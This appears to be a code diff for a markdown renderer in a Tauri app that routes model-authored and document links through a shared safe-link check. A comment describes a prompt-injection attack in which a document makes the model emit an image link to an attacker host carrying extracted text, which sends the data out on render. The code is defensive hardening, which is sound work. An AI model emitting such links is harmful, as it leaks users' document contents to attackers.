@@ -2,6 +2,7 @@ import { createContext, memo, useContext, useMemo, type ReactNode } from "react"
 import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { openUrl } from "@tauri-apps/plugin-opener";
+import { isSafeLink, schemeOf } from "../lib/safe-link";
 import type { AnchorHTMLAttributes, ImgHTMLAttributes } from "react";
 import { useStreamingReveal } from "../hooks/useStreamingReveal";
 import { remarkPageRefs, PAGE_REF_SCHEME } from "../lib/remark-page-refs";
@@ -25,7 +26,8 @@ interface MarkdownProps {
   live?: boolean;
 }
 
-const SAFE_LINK_SCHEMES = ["http:", "https:", "mailto:"];
+// Shared with the PDF link layer: document URLs and model-authored URLs are
+// both untrusted, and both go through the same gate.
 // http(s) is deliberately absent: model-authored markdown must never auto-fetch
 // a remote URL. A prompt-injected document could make the model emit
 // ![x](https://attacker/?d=<extracted text>) and exfiltrate on render.
@@ -36,14 +38,6 @@ const markdownComponents = {
   a: SafeAnchor,
   img: SafeImg,
 };
-
-function schemeOf(url: string): string | null {
-  try {
-    return new URL(url, "app://local").protocol;
-  } catch {
-    return null;
-  }
-}
 
 function SafeAnchor({
   href,
@@ -56,10 +50,7 @@ function SafeAnchor({
     const page = parseInt(target.slice(PAGE_REF_SCHEME.length), 10);
     return <PageRefLink page={page}>{children}</PageRefLink>;
   }
-  const scheme = schemeOf(target);
-  const allowed = !!scheme && SAFE_LINK_SCHEMES.includes(scheme);
-
-  if (!allowed) {
+  if (!isSafeLink(target)) {
     return <span {...rest}>{children}</span>;
   }
 
